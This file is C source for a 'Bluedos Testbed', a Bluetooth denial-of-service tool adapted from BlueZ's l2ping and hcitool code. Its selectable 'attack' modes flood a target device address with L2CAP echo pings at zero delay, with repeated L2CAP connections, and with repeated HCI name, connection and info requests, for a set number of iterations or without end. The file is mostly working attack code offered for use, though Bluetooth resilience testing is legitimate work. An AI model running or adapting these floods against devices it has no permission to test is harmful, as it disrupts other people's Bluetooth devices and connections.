// SPDX-License-Identifier: GPL-2.0-or-later
/*
 *
 *  BlueZ - Bluetooth protocol stack for Linux
 *
 *  Copyright (C) 2023  Poonam Shelke <shelkepoonam29@gmail.com><s.poonam@iitg.ac.in>
 *  Copyright (C) 2023  Nitish Kalan <nk221212@gmail.com><nitismk@iitk.ac.in>
 *
 *
 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif
#ifndef MIN
#define MIN(a, b) ((a) < (b) ? (a) : (b))
#endif
#define _GNU_SOURCE
#define LE_LINK		0x80
#define for_each_opt(opt, long, short) while ((opt=getopt_long(argc, argv, short ? short:"+", long, NULL)) != -1)
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>
#include <sys/time.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include "lib/bluetooth.h"
#include "lib/hci.h"
#include "lib/hci_lib.h"
#include "lib/l2cap.h"
#include "src/oui.h"
/* Defaults */
static bdaddr_t bdaddr;
static int size    = 44;
static int ident   = 200;
static int delay   = 1;
static int count   = -1;
static int timeout = 10;
static int it_flag = 1;
static int reverse = 0;
static int verify = 0;
static char *protocol;
static char *attack;
static int iteration_count = 0 ;

/* Stats */
static int sent_pkt = 0;
static int recv_pkt = 0;

static volatile int signal_received = 0;

static float tv2fl(struct timeval tv)
{
	return (float)(tv.tv_sec*1000.0) + (float)(tv.tv_usec/1000.0);
}

static void stat(int sig)
{
	int loss = sent_pkt ? (float)((sent_pkt-recv_pkt)/(sent_pkt/100.0)) : 0;
	printf("%d sent, %d received, %d%% loss\n", sent_pkt, recv_pkt, loss);
	exit(0);
}

static void ping(char *svr)
{
	struct sigaction sa;
	struct sockaddr_l2 addr;
	socklen_t optlen;
	unsigned char *send_buf;
	unsigned char *recv_buf;
	char str[18];
	int i, sk, lost;
	uint8_t id;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = stat;
	sigaction(SIGINT, &sa, NULL);

	send_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
	recv_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
	if (!send_buf || !recv_buf) {
		perror("Can't allocate buffer");
		exit(1);
	}

	/* Create socket */
	sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
	if (sk < 0) {
		perror("Can't create socket");
		goto error;
	}

	/* Bind to local address */
	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, &bdaddr);

	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("Can't bind socket");
		goto error;
	}

	/* Connect to remote device */
	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	str2ba(svr, &addr.l2_bdaddr);

	if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("Can't connect");
		goto error;
	}

	/* Get local address */
	memset(&addr, 0, sizeof(addr));
	optlen = sizeof(addr);

	if (getsockname(sk, (struct sockaddr *) &addr, &optlen) < 0) {
		perror("Can't get local address");
		goto error;
	}

	ba2str(&addr.l2_bdaddr, str);
	printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);

	/* Initialize send buffer */
	for (i = 0; i < size; i++)
		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';

	id = ident;

	while (count == -1 || count-- > 0) {
		struct timeval tv_send, tv_recv, tv_diff;
		l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
		l2cap_cmd_hdr *recv_cmd = (l2cap_cmd_hdr *) recv_buf;

		/* Build command header */
		send_cmd->ident = id;
		send_cmd->len   = htobs(size);

		if (reverse)
			send_cmd->code = L2CAP_ECHO_RSP;
		else
			send_cmd->code = L2CAP_ECHO_REQ;

		gettimeofday(&tv_send, NULL);

		/* Send Echo Command */
		if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0) {
			perror("Send failed");
			goto error;
		}

		/* Wait for Echo Response */
		lost = 0;
		while (1) {
			struct pollfd pf[1];
			int err;

			pf[0].fd = sk;
			pf[0].events = POLLIN;

			if ((err = poll(pf, 1, timeout * 1000)) < 0) {
				perror("Poll failed");
				goto error;
			}

			if (!err) {
				lost = 1;
				break;
			}

			if ((err = recv(sk, recv_buf, L2CAP_CMD_HDR_SIZE + size, 0)) < 0) {
				perror("Recv failed");
				goto error;
			}

			if (!err){
				printf("Disconnected\n");
				goto error;
			}

			recv_cmd->len = btohs(recv_cmd->len);

			/* Check for our id */
			if (recv_cmd->ident != id)
				continue;

			/* Check type */
			if (!reverse && recv_cmd->code == L2CAP_ECHO_RSP)
				break;

			if (recv_cmd->code == L2CAP_COMMAND_REJ) {
				printf("Peer doesn't support Echo packets\n");
				goto error;
			}

		}
		sent_pkt++;

		if (!lost) {
			recv_pkt++;

			gettimeofday(&tv_recv, NULL);
			timersub(&tv_recv, &tv_send, &tv_diff);

			if (verify) {
				/* Check payload length */
				if (recv_cmd->len != size) {
					fprintf(stderr, "Received %d bytes, expected %d\n",
						   recv_cmd->len, size);
					goto error;
				}

				/* Check payload */
				if (memcmp(&send_buf[L2CAP_CMD_HDR_SIZE],
						   &recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
					fprintf(stderr, "Response payload different.\n");
					goto error;
				}
			}

			printf("%d bytes from %s id %d time %.2fms\n", recv_cmd->len, svr,
				   id - ident, tv2fl(tv_diff));

			if (delay)
				sleep(delay);
		} else {
			printf("no response from %s: id %d\n", svr, id - ident);
		}

		if (++id > 254)
			id = ident;
	}
	stat(0);
	free(send_buf);
	free(recv_buf);
	return;

error:
	close(sk);
	free(send_buf);
	free(recv_buf);
	exit(1);
}

/*---------------------------------------------lp2 connection attack--------------------------------------------------------------------*/
/*--------------------------------------------------------------------------------------------------------------------------------------*/

static void connection(char *svr){
	struct sigaction sa;
	struct sockaddr_l2 addr;
	socklen_t optlen;
	unsigned char *send_buf;
	unsigned char *recv_buf;
	char str[18];
	int i, sk, lost;
	uint8_t id;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = stat;
	sigaction(SIGINT, &sa, NULL);

	send_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
	recv_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
	if (!send_buf || !recv_buf) {
		perror("Can't allocate buffer");
		exit(1);
	}

	/* Create socket */
	sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
	if (sk < 0) {
		perror("Can't create socket");
		goto error;
	}

	/* Bind to local address */
	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, &bdaddr);

	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("Can't bind socket");
		goto error;
	}

	/* Connect to remote device */
	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	str2ba(svr, &addr.l2_bdaddr);

	if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("Can't connect");
		goto error;
	}
	if(iteration_count==0){
		iteration_count=1;
		it_flag=0;

	}
	while (iteration_count)   {
		printf("Build socket started\n");
		sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
		printf("Build socket ended\n");
		if (sk < 0) {
			perror("Can't create socket");
			goto error;
		}
		printf("Connect started\n");

		if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
			perror("Can't connect");
			//goto error;
		}   
		else    {
			printf("connection established");
		}
		printf("Connect ended\n");
		close(sk);
		if(it_flag!=0){
			iteration_count--;

		}
	}
	error:
	close(sk);
	free(send_buf);
	free(recv_buf);
	exit(1);
}


/*---------------------------------------------hcitool attacks--------------------------------------------------------------------------------------*/

/*------------------------------------------------name----------------------------------------------------------------------------------------------*/


static int str2buf(const char *str, uint8_t *buf, size_t blen)
{
	int i, dlen;

	if (str == NULL)
		return -EINVAL;

	memset(buf, 0, blen);

	dlen = MIN((strlen(str) / 2), blen);

	for (i = 0; i < dlen; i++)
		sscanf(str + (i * 2), "%02hhX", &buf[i]);

	return 0;
}

static int dev_info(int s, int dev_id, long arg)
{
	struct hci_dev_info di = { .dev_id = dev_id };
	char addr[18];

	if (ioctl(s, HCIGETDEVINFO, (void *) &di))
		return 0;

	ba2str(&di.bdaddr, addr);
	printf("\t%s\t%s\n", di.name, addr);
	return 0;
}

static void helper_arg(int min_num_arg, int max_num_arg, int *argc,
			char ***argv, const char *usage)
{
	*argc -= optind;
	/* too many arguments, but when "max_num_arg < min_num_arg" then no
		 limiting (prefer "max_num_arg=-1" to gen infinity)
	*/
	if ( (*argc > max_num_arg) && (max_num_arg >= min_num_arg ) ) {
		fprintf(stderr, "%s: too many arguments (maximal: %i)\n",
				*argv[0], max_num_arg);
		printf("%s", usage);
		exit(1);
	}

	/* print usage */
	if (*argc < min_num_arg) {
		fprintf(stderr, "%s: too few arguments (minimal: %i)\n",
				*argv[0], min_num_arg);
		printf("%s", usage);
		exit(0);
	}

	*argv += optind;
}

static char *type2str(uint8_t type)
{
	switch (type) {
	case SCO_LINK:
		return "SCO";
	case ACL_LINK:
		return "ACL";
	case ESCO_LINK:
		return "eSCO";
	case LE_LINK:
		return "LE";
	default:
		return "Unknown";
	}
}

static int conn_list(int s, int dev_id, long arg)
{
	struct hci_conn_list_req *cl;
	struct hci_conn_info *ci;
	int id = arg;
	int i;

	if (id != -1 && dev_id != id)
		return 0;

	if (!(cl = malloc(10 * sizeof(*ci) + sizeof(*cl)))) {
		perror("Can't allocate memory");
		exit(1);
	}
	cl->dev_id = dev_id;
	cl->conn_num = 10;
	ci = cl->conn_info;

	if (ioctl(s, HCIGETCONNLIST, (void *) cl)) {
		perror("Can't get connection list");
		exit(1);
	}

	for (i = 0; i < cl->conn_num; i++, ci++) {
		char addr[18];
		char *str;
		ba2str(&ci->bdaddr, addr);
		str = hci_lmtostr(ci->link_mode);
		printf("\t%s %s %s handle %d state %d lm %s\n",
			ci->out ? "<" : ">", type2str(ci->type),
			addr, ci->handle, ci->state, str);
		bt_free(str);
	}

	free(cl);
	return 0;
}

static int find_conn(int s, int dev_id, long arg)
{
	struct hci_conn_list_req *cl;
	struct hci_conn_info *ci;
	int i;

	if (!(cl = malloc(10 * sizeof(*ci) + sizeof(*cl)))) {
		perror("Can't allocate memory");
		exit(1);
	}
	cl->dev_id = dev_id;
	cl->conn_num = 10;
	ci = cl->conn_info;

	if (ioctl(s, HCIGETCONNLIST, (void *) cl)) {
		perror("Can't get connection list");
		exit(1);
	}

	for (i = 0; i < cl->conn_num; i++, ci++)
		if (!bacmp((bdaddr_t *) arg, &ci->bdaddr)) {
			free(cl);
			return 1;
		}

	free(cl);
	return 0;
}

static void hex_dump(char *pref, int width, unsigned char *buf, int len)
{
	register int i,n;

	for (i = 0, n = 1; i < len; i++, n++) {
		if (n == 1)
			printf("%s", pref);
		printf("%2.2X ", buf[i]);
		if (n == width) {
			printf("\n");
			n = 0;
		}
	}
	if (i && n!=1)
		printf("\n");
}

static char *get_minor_device_name(int major, int minor)
{
	switch (major) {
	case 0:	/* misc */
		return "";
	case 1:	/* computer */
		switch (minor) {
		case 0:
			return "Uncategorized";
		case 1:
			return "Desktop workstation";
		case 2:
			return "Server";
		case 3:
			return "Laptop";
		case 4:
			return "Handheld";
		case 5:
			return "Palm";
		case 6:
			return "Wearable";
		}
		break;
	case 2:	/* phone */
		switch (minor) {
		case 0:
			return "Uncategorized";
		case 1:
			return "Cellular";
		case 2:
			return "Cordless";
		case 3:
			return "Smart phone";
		case 4:
			return "Wired modem or voice gateway";
		case 5:
			return "Common ISDN Access";
		case 6:
			return "Sim Card Reader";
		}
		break;
	case 3:	/* lan access */
		if (minor == 0)
			return "Uncategorized";
		switch (minor / 8) {
		case 0:
			return "Fully available";
		case 1:
			return "1-17% utilized";
		case 2:
			return "17-33% utilized";
		case 3:
			return "33-50% utilized";
		case 4:
			return "50-67% utilized";
		case 5:
			return "67-83% utilized";
		case 6:
			return "83-99% utilized";
		case 7:
			return "No service available";
		}
		break;
	case 4:	/* audio/video */
		switch (minor) {
		case 0:
			return "Uncategorized";
		case 1:
			return "Device conforms to the Headset profile";
		case 2:
			return "Hands-free";
			/* 3 is reserved */
		case 4:
			return "Microphone";
		case 5:
			return "Loudspeaker";
		case 6:
			return "Headphones";
		case 7:
			return "Portable Audio";
		case 8:
			return "Car Audio";
		case 9:
			return "Set-top box";
		case 10:
			return "HiFi Audio Device";
		case 11:
			return "VCR";
		case 12:
			return "Video Camera";
		case 13:
			return "Camcorder";
		case 14:
			return "Video Monitor";
		case 15:
			return "Video Display and Loudspeaker";
		case 16:
			return "Video Conferencing";
			/* 17 is reserved */
		case 18:
			return "Gaming/Toy";
		}
		break;
	case 5:	/* peripheral */ {
		static char cls_str[48]; cls_str[0] = 0;

		switch (minor & 48) {
		case 16:
			strncpy(cls_str, "Keyboard", sizeof(cls_str));
			break;
		case 32:
			strncpy(cls_str, "Pointing device", sizeof(cls_str));
			break;
		case 48:
			strncpy(cls_str, "Combo keyboard/pointing device", sizeof(cls_str));
			break;
		}
		if ((minor & 15) && (strlen(cls_str) > 0))
			strcat(cls_str, "/");

		switch (minor & 15) {
		case 0:
			break;
		case 1:
			strncat(cls_str, "Joystick",
					sizeof(cls_str) - strlen(cls_str) - 1);
			break;
		case 2:
			strncat(cls_str, "Gamepad",
					sizeof(cls_str) - strlen(cls_str) - 1);
			break;
		case 3:
			strncat(cls_str, "Remote control",
					sizeof(cls_str) - strlen(cls_str) - 1);
			break;
		case 4:
			strncat(cls_str, "Sensing device",
					sizeof(cls_str) - strlen(cls_str) - 1);
			break;
		case 5:
			strncat(cls_str, "Digitizer tablet",
					sizeof(cls_str) - strlen(cls_str) - 1);
			break;
		case 6:
			strncat(cls_str, "Card reader",
					sizeof(cls_str) - strlen(cls_str) - 1);
			break;
		default:
			strncat(cls_str, "(reserved)",
					sizeof(cls_str) - strlen(cls_str) - 1);
			break;
		}
		if (strlen(cls_str) > 0)
			return cls_str;
		break;
	}
	case 6:	/* imaging */
		if (minor & 4)
			return "Display";
		if (minor & 8)
			return "Camera";
		if (minor & 16)
			return "Scanner";
		if (minor & 32)
			return "Printer";
		break;
	case 7: /* wearable */
		switch (minor) {
		case 1:
			return "Wrist Watch";
		case 2:
			return "Pager";
		case 3:
			return "Jacket";
		case 4:
			return "Helmet";
		case 5:
			return "Glasses";
		}
		break;
	case 8: /* toy */
		switch (minor) {
		case 1:
			return "Robot";
		case 2:
			return "Vehicle";
		case 3:
			return "Doll / Action Figure";
		case 4:
			return "Controller";
		case 5:
			return "Game";
		}
		break;
	case 63:	/* uncategorised */
		return "";
	}
	return "Unknown (reserved) minor device class";
}

static char *major_classes[] = {
	"Miscellaneous", "Computer", "Phone", "LAN Access",
	"Audio/Video", "Peripheral", "Imaging", "Uncategorized"
};

/* Remote name */


static struct option name_options[] = {
	{ "help",	0, 0, 'h' },
	{ 0, 0, 0, 0 }
};

static const char *name_help =
	"Usage:\n"
	"\tname <bdaddr>\n";

static void cmd_name(int dev_id, int argc, char **argv)
{
	bdaddr_t bdaddr;
	char name[248];
	int opt, dd;

	for_each_opt(opt, name_options, NULL) {
		switch (opt) {
		default:
			printf("%s", name_help);
			return;
		}
	}
	helper_arg(1, 1, &argc, &argv, name_help);

	str2ba(argv[0], &bdaddr);

	if (dev_id < 0) {
		dev_id = hci_get_route(&bdaddr);
		if (dev_id < 0) {
			fprintf(stderr, "Device is not available.\n");
			exit(1);
		}
	}

	dd = hci_open_dev(dev_id);
	if (dd < 0) {
		perror("HCI device open failed");
		exit(1);
	}
	if(iteration_count==0){
		iteration_count=1;
		it_flag=0;
	}
	while(iteration_count){
		if (hci_read_remote_name(dd, &bdaddr, sizeof(name), name, 25000) == 0)
		printf("%s\n", name);
		if(it_flag!=0){
			iteration_count--;
		}
	}

	hci_close_dev(dd);
}

/* Info about remote device */

static struct option info_options[] = {
	{ "help",	0, 0, 'h' },
	{ 0, 0, 0, 0 }
};

static const char *info_help =
	"Usage:\n"
	"\tinfo <bdaddr>\n";

static void cmd_info(int dev_id, int argc, char **argv)
{
	bdaddr_t bdaddr;
	uint16_t handle;
	uint8_t features[8], max_page = 0;
	char name[249], *comp, *tmp;
	struct hci_version version;
	struct hci_dev_info di;
	struct hci_conn_info_req *cr;
	int i, opt, dd, cc = 0;

	for_each_opt(opt, info_options, NULL) {
		switch (opt) {
		default:
			printf("%s", info_help);
			return;
		}
	}
	helper_arg(1, 1, &argc, &argv, info_help);

	str2ba(argv[0], &bdaddr);

	if (dev_id < 0)
		dev_id = hci_for_each_dev(HCI_UP, find_conn, (long) &bdaddr);

	if (dev_id < 0)
		dev_id = hci_get_route(&bdaddr);

	if (dev_id < 0) {
		fprintf(stderr, "Device is not available or not connected.\n");
		exit(1);
	}

	if (hci_devinfo(dev_id, &di) < 0) {
		perror("Can't get device info");
		exit(1);
	}

	printf("Requesting information ...\n");

	dd = hci_open_dev(dev_id);
	if (dd < 0) {
		perror("HCI device open failed");
		exit(1);
	}

	cr = malloc(sizeof(*cr) + sizeof(struct hci_conn_info));
	if (!cr) {
		perror("Can't get connection info");
		close(dd);
		exit(1);
	}

	bacpy(&cr->bdaddr, &bdaddr);
	cr->type = ACL_LINK;
	if (ioctl(dd, HCIGETCONNINFO, (unsigned long) cr) < 0) {
		if (hci_create_connection(dd, &bdaddr,
					htobs(di.pkt_type & ACL_PTYPE_MASK),
					0, 0x01, &handle, 25000) < 0) {
			perror("Can't create connection");
			free(cr);
			close(dd);
			exit(1);
		}
		sleep(1);
		cc = 1;
	} else
		handle = htobs(cr->conn_info->handle);

	free(cr);

	printf("\tBD Address:  %s\n", argv[0]);

	comp = batocomp(&bdaddr);
	if (comp) {
		char oui[9];
		ba2oui(&bdaddr, oui);
		printf("\tOUI Company: %s (%s)\n", comp, oui);
		free(comp);
	}

	if (hci_read_remote_name(dd, &bdaddr, sizeof(name), name, 25000) == 0)
		printf("\tDevice Name: %s\n", name);

	if (hci_read_remote_version(dd, handle, &version, 20000) == 0) {
		char *ver = lmp_vertostr(version.lmp_ver);
		printf("\tLMP Version: %s (0x%x) LMP Subversion: 0x%x\n"
			"\tManufacturer: %s (%d)\n",
			ver ? ver : "n/a",
			version.lmp_ver,
			version.lmp_subver,
			bt_compidtostr(version.manufacturer),
			version.manufacturer);
		if (ver)
			bt_free(ver);
	}

	memset(features, 0, sizeof(features));
	hci_read_remote_features(dd, handle, features, 20000);

	if ((di.features[7] & LMP_EXT_FEAT) && (features[7] & LMP_EXT_FEAT))
		hci_read_remote_ext_features(dd, handle, 0, &max_page,
							features, 20000);

	if (max_page < 1 && (features[6] & LMP_SIMPLE_PAIR))
		max_page = 1;

	printf("\tFeatures%s: 0x%2.2x 0x%2.2x 0x%2.2x 0x%2.2x "
				"0x%2.2x 0x%2.2x 0x%2.2x 0x%2.2x\n",
		(max_page > 0) ? " page 0" : "",
		features[0], features[1], features[2], features[3],
		features[4], features[5], features[6], features[7]);

	tmp = lmp_featurestostr(features, "\t\t", 63);
	printf("%s\n", tmp);
	bt_free(tmp);

	for (i = 1; i <= max_page; i++) {
		if (hci_read_remote_ext_features(dd, handle, i, NULL,
							features, 20000) < 0)
			continue;

		printf("\tFeatures page %d: 0x%2.2x 0x%2.2x 0x%2.2x 0x%2.2x "
					"0x%2.2x 0x%2.2x 0x%2.2x 0x%2.2x\n", i,
			features[0], features[1], features[2], features[3],
			features[4], features[5], features[6], features[7]);
	}

	if(iteration_count==0){
		iteration_count=1;
		it_flag=0;
	}
	while(iteration_count){
		if (cc) {
			usleep(10000);
			hci_disconnect(dd, handle, HCI_OE_USER_ENDED_CONNECTION, 10000);
		}
		if(it_flag!=0){
			iteration_count--;
		}
	}
	hci_close_dev(dd);
}


/* Create connection */

static struct option cc_options[] = {
	{ "help",	0, 0, 'h' },
	{ "role",	1, 0, 'r' },
	{ "ptype",	1, 0, 'p' },
	{ 0, 0, 0, 0 }
};

static const char *cc_help =
	"Usage:\n"
	"\tcc [--role=c|p] [--ptype=pkt_types] <bdaddr>\n"
	"Example:\n"
	"\tcc --ptype=dm1,dh3,dh5 01:02:03:04:05:06\n"
	"\tcc --role=c 01:02:03:04:05:06\n";

static void cmd_cc(int dev_id, int argc, char **argv)
{
	bdaddr_t bdaddr;
	uint16_t handle;
	uint8_t role;
	unsigned int ptype;
	int dd, opt;

	role = 0x01;
	ptype = HCI_DM1 | HCI_DM3 | HCI_DM5 | HCI_DH1 | HCI_DH3 | HCI_DH5;

	for_each_opt(opt, cc_options, NULL) {
		switch (opt) {
		case 'p':
			hci_strtoptype(optarg, &ptype);
			break;

		case 'r':
			role = optarg[0] == 'm' || optarg[0] == 'c' ? 0 : 1;
			break;

		default:
			printf("%s", cc_help);
			return;
		}
	}
	helper_arg(1, 1, &argc, &argv, cc_help);

	str2ba(argv[0], &bdaddr);

	if (dev_id < 0) {
		dev_id = hci_get_route(&bdaddr);
		if (dev_id < 0) {
			fprintf(stderr, "Device is not available.\n");
			exit(1);
		}
	}

	dd = hci_open_dev(dev_id);
	if (dd < 0) {
		perror("HCI device open failed");
		exit(1);
	}
	if(iteration_count==0){
		iteration_count=1;
		it_flag=0;
	}
	while(iteration_count){
		if (hci_create_connection(dd, &bdaddr, htobs(ptype),
				htobs(0x0000), role, &handle, 25000) < 0)
		perror("Can't create connection");
		if(it_flag!=0){
			iteration_count--;
		}
	}
	
	hci_close_dev(dd);
}

static struct option lecc_options[] = {
	{ "help",	0, 0, 'h' },
	{ "static",	0, 0, 's' },
	{ "random",	0, 0, 'r' },
	{ "whitelist",	0, 0, 'w' }, /* Deprecated. Kept for compatibility. */
	{ "acceptlist",	0, 0, 'a' },
	{ 0, 0, 0, 0 }
};

static const char *lecc_help =
	"Usage:\n"
	"\tlecc [--static] [--random] <bdaddr>\n"
	"\tlecc --acceptlist\n";

static void cmd_lecc(int dev_id, int argc, char **argv)
{
	printf("in cmd_lecc");
	int err, opt, dd;
	bdaddr_t bdaddr;
	uint16_t interval, latency, max_ce_length, max_interval, min_ce_length;
	uint16_t min_interval, supervision_timeout, window, handle;
	uint8_t initiator_filter, own_bdaddr_type, peer_bdaddr_type;

	own_bdaddr_type = LE_PUBLIC_ADDRESS;
	peer_bdaddr_type = LE_PUBLIC_ADDRESS;
	initiator_filter = 0; /* Use peer address */

	for_each_opt(opt, lecc_options, NULL) {
		switch (opt) {
		case 's':
			own_bdaddr_type = LE_RANDOM_ADDRESS;
			break;
		case 'r':
			peer_bdaddr_type = LE_RANDOM_ADDRESS;
			break;
		case 'w': /* Deprecated. Kept for compatibility. */
		case 'a':
			initiator_filter = 0x01; /* Use accept list */
			break;
		default:
			printf("%s", lecc_help);
			return;
		}
	}
	helper_arg(0, 1, &argc, &argv, lecc_help);

	if (dev_id < 0)
		dev_id = hci_get_route(NULL);

	dd = hci_open_dev(dev_id);
	if (dd < 0) {
		perror("Could not open device");
		exit(1);
	}

	memset(&bdaddr, 0, sizeof(bdaddr_t));
	if (argv[0])
		str2ba(argv[0], &bdaddr);

	interval = htobs(0x0004);
	window = htobs(0x0004);
	min_interval = htobs(0x000F);
	max_interval = htobs(0x000F);
	latency = htobs(0x0000);
	supervision_timeout = htobs(0x0C80);
	min_ce_length = htobs(0x0001);
	max_ce_length = htobs(0x0001);

	err = hci_le_create_conn(dd, interval, window, initiator_filter,
			peer_bdaddr_type, bdaddr, own_bdaddr_type, min_interval,
			max_interval, latency, supervision_timeout,
			min_ce_length, max_ce_length, &handle, 25000);
	if (err < 0) {
		perror("Could not create connection");
		exit(1);
	}

	printf("Connection handle %d\n", handle);

	hci_close_dev(dd);
}

static struct option leinfo_options[] = {
	{ "help",	0, 0, 'h' },
	{ "static",	0, 0, 's' },
	{ "random",	0, 0, 'r' },
	{ 0, 0, 0, 0 }
};

static const char *leinfo_help =
	"Usage:\n"
	"\tleinfo [--static] [--random] <bdaddr>\n";

static void cmd_leinfo(int dev_id, int argc, char **argv)
{
	bdaddr_t bdaddr;
	uint16_t handle;
	uint8_t features[8];
	struct hci_version version;
	uint16_t interval, latency, max_ce_length, max_interval, min_ce_length;
	uint16_t min_interval, supervision_timeout, window;
	uint8_t initiator_filter, own_bdaddr_type, peer_bdaddr_type;
	int opt, err, dd;

	own_bdaddr_type = LE_PUBLIC_ADDRESS;
	peer_bdaddr_type = LE_PUBLIC_ADDRESS;

	for_each_opt(opt, leinfo_options, NULL) {
		switch (opt) {
		case 's':
			own_bdaddr_type = LE_RANDOM_ADDRESS;
			break;
		case 'r':
			peer_bdaddr_type = LE_RANDOM_ADDRESS;
			break;
		default:
			printf("%s", leinfo_help);
			return;
		}
	}
	helper_arg(1, 1, &argc, &argv, leinfo_help);

	str2ba(argv[0], &bdaddr);

	printf("Requesting information ...\n");

	if (dev_id < 0)
		dev_id = hci_get_route(NULL);

	dd = hci_open_dev(dev_id);
	if (dd < 0) {
		perror("Could not open device");
		exit(1);
	}

	interval = htobs(0x0004);
	window = htobs(0x0004);
	initiator_filter = 0;
	min_interval = htobs(0x000F);
	max_interval = htobs(0x000F);
	latency = htobs(0x0000);
	supervision_timeout = htobs(0x0C80);
	min_ce_length = htobs(0x0000);
	max_ce_length = htobs(0x0000);

	err = hci_le_create_conn(dd, interval, window, initiator_filter,
			peer_bdaddr_type, bdaddr, own_bdaddr_type, min_interval,
			max_interval, latency, supervision_timeout,
			min_ce_length, max_ce_length, &handle, 25000);
	if (err < 0) {
		perror("Could not create connection");
		exit(1);
	}

	printf("\tHandle: %d (0x%04x)\n", handle, handle);

	if (hci_read_remote_version(dd, handle, &version, 20000) == 0) {
		char *ver = lmp_vertostr(version.lmp_ver);
		printf("\tLMP Version: %s (0x%x) LMP Subversion: 0x%x\n"
			"\tManufacturer: %s (%d)\n",
			ver ? ver : "n/a",
			version.lmp_ver,
			version.lmp_subver,
			bt_compidtostr(version.manufacturer),
			version.manufacturer);
		if (ver)
			bt_free(ver);
	}

	memset(features, 0, sizeof(features));
	hci_le_read_remote_features(dd, handle, features, 20000);

	printf("\tFeatures: 0x%2.2x 0x%2.2x 0x%2.2x 0x%2.2x "
				"0x%2.2x 0x%2.2x 0x%2.2x 0x%2.2x\n",
		features[0], features[1], features[2], features[3],
		features[4], features[5], features[6], features[7]);

	usleep(10000);
	hci_disconnect(dd, handle, HCI_OE_USER_ENDED_CONNECTION, 10000);

	hci_close_dev(dd);
}

/*---------------------------------------------------------main function-------------------------------------------------------------------------------*/

/*------------------------------------------------------------------------------------------------------------------------------------------------------*/
static void usage(void)
{
	printf("Bluedos Testbed\n");
	printf("Usage:\n");
	printf("\tbluedos [-p protocol] [-s size] [-i iterationcount] [-a attack] [-f] <bdaddr>\n");
	printf("\t-p  protocol type (l2ping || hcitool )\n");
	printf("\t-i  For number of iteration attack will be on. Default : infinite\n");
	printf("\t-a  Attack type : l2ping [ ping , connection ] || hcitool [name , info , lecc , cc , leinfo ]\n ");
	printf("\t-f  Flood ping (delay = 0)\n");
	
}

int main(int argc, char *argv[])
{
	int opt,  dev_id = -1;
	/* Default options */
	bacpy(&bdaddr, BDADDR_ANY);

	while ((opt=getopt(argc,argv,"p:s:a:c:i:f")) != EOF) {
		switch(opt) {
		case 'p':

			protocol=optarg;
			break;

		case 's':
			size = atoi(optarg);
			break;

		case 'a':
			attack=optarg;
			break;	

		case 'c':
			count=atoi(optarg);
			break;	

		case 'i':
			iteration_count=atoi(optarg);
			break;	
	

		case 'f':
			/* Kinda flood ping */
			delay = 0;
			break;
			
		default:
			usage();
			exit(0);
		}
	}

	if (!(argc - optind)) {
		usage();
		exit(1);
	}


	if (strcmp(protocol , "l2ping") == 0 && strcmp(attack, "ping") == 0) {
		ping(argv[optind]);
	}
	else if (strcmp(protocol, "l2ping") == 0 && strcmp(attack, "connection") == 0) {
		connection(argv[optind]);
	}
	else if (strcmp(protocol, "hcitool") == 0 && strcmp(attack, "name") == 0) {
		cmd_name(dev_id, argc, argv);
	}

	else if (strcmp(protocol, "hcitool") == 0 && strcmp(attack, "info") == 0){
		cmd_info(dev_id, argc, argv);
	}
	else if (strcmp(protocol, "hcitool") == 0 && strcmp(attack, "cc") == 0) {
		cmd_cc(dev_id, argc, argv);
	}
	else if (strcmp(protocol, "hcitool") == 0 && strcmp(attack, "lecc") == 0) {
		cmd_lecc(dev_id, argc, argv);
	}
	else if (strcmp(protocol,"hcitool") == 0 && strcmp(attack, "leinfo") == 0){
		cmd_leinfo(dev_id, argc, argv);
	}
	else {
		printf("invalid protocol");
		exit(1);
	}
	
	return 0;
}
